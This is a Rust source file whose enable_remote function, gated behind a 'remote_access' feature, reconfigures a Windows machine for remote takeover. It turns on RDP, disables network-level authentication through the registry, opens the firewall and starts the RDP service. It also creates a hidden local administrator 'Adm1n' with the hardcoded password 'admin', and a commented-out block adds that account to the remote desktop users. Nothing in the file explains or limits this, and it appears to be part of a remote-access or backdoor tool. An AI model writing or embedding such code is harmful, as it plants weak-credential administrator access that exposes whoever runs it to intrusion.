use std::process::Command;

use winreg::enums::HKEY_LOCAL_MACHINE;

pub fn enable_remote() -> std::io::Result<()> {
    if cfg!(feature = "remote_access") {
        let reg = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
        let rdp_key = reg.open_subkey_with_flags(
            r"SYSTEM\CurrentControlSet\Control\Terminal Server",
            winreg::enums::KEY_WRITE,
        )?;
        rdp_key.set_value("fDenyTSConnections", &0u32)?;

        let sec = reg.open_subkey_with_flags(
            r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
            winreg::enums::KEY_WRITE,
        )?;
        sec.set_value("UserAuthentication", &0u32)?;

        let netsh = Command::new("netsh")
            .arg("advfirewall")
            .arg("firewall")
            .arg("set")
            .arg("rule")
            .arg("group=\"remote desktop\"")
            .arg("new")
            .arg("enable=Yes")
            .spawn();

        if netsh.is_ok() {
            println!("Firewall rule enabled successfully.");
        } else {
            println!("Failed to enable firewall rule.");
        }

        let rdpservice = Command::new("sc").arg("start").arg("TermService").spawn();

        if rdpservice.is_ok() {
            println!("RDP service started successfully.");
        } else {
            println!("Failed to start RDP service.");
        }

        // create admin account
        let create_admin = Command::new("net")
            .arg("user")
            .arg("Adm1n")
            .arg("admin")
            .arg("/add")
            .spawn();

        if create_admin.is_ok() {
            println!("Admin account created successfully.");
        } else {
            println!("Failed to create admin account.");
        }

        let add_to_admin = Command::new("net")
            .arg("localgroup")
            .arg("administrators")
            .arg("Adm1n")
            .arg("/add")
            .spawn();

        if add_to_admin.is_ok() {
            println!("Admin account added to administrators group successfully.");
        } else {
            println!("Failed to add admin account to administrators group.");
        }

        //gpedit

        let pol = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
        let polkey = pol.open_subkey_with_flags(
            r"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services",
            winreg::enums::KEY_WRITE,
        )?;

        polkey.set_value("fDenyTSConnections", &0u32)?;

        let gpupdate = Command::new("gpupdate").spawn();

        if gpupdate.is_ok() {
            println!("Group Policy updated successfully.");
        } else {
            println!("Failed to update Group Policy.");
        }

        // add aegis to remote desktop users
        /*
        let add_to_rdusers = Command::new("net")
            .arg("localgroup")
            .arg("\"Remote Desktop Users\"")
            .arg("Adm1n")
            .arg("/add")
            .spawn();

        if add_to_rdusers.is_ok() {
            println!("Added to Remote Desktop Users group successfully.");
        } else {
            println!("Failed to add Admin account to Remote Desktop Users group.");
        }
        */
    }
    Ok(())
}
